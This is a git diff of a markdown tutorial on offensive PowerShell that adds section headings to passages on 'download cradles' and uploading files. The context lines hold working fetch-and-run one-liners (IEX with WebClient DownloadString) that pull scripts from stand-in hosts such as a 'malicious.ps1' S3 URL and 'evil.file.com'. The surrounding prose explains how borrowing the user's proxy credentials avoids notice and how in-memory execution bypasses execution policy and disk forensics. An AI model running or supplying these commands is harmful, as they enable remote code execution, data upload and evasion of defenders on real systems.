@@ -71,7 +71,10 @@ $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 IEX $wc.DownloadString("https://s3bucket.amazonaws.com/malicious.ps1")
 ~~~
 
-In this instance we are taking the logged in user's credentials and using the proxy, not just bypassing it, using it, which is great! We look like a normal web user and unless we're under scrutiny, we look like a normal user. When we use powershell (or any language) to download a file, it's called a "download cradle"
+In this instance we are taking the logged in user's credentials and using the proxy, not just bypassing it, using it, which is great! We look like a normal web user and unless we're under scrutiny, we look like a normal user. 
+
+#### Download Cradles
+When we use powershell (or any language) to download a file, it's called a "download cradle"
 
 Typical download cradles look like this:
 ~~~
@@ -79,5 +82,11 @@ IEX (New-Object Net.WebClient).downloadstring("http://evil.file.com/pwnagestego.
 ~~~
 "System"  it's still invoked it just doesn't need to fully  be named. IEX is actually short for invoke expression and will actually launch the PS code, directly into memory, without touching the disk, bypassing execution restriction policies, and even throwing disk based forensics off. Kepe in mind, there are definitely more download cradles, this is just one example.
 
-Just as we can create a downloader, we can create an uploader as well.
+#### Uploader
+Just as we can download files, we can upload them as well. System.Net.WebClient offers methods for this such as
 
+System.Net.WebClient
+-UploadString
+-UploadFile
+-UploadData
+-and more too!
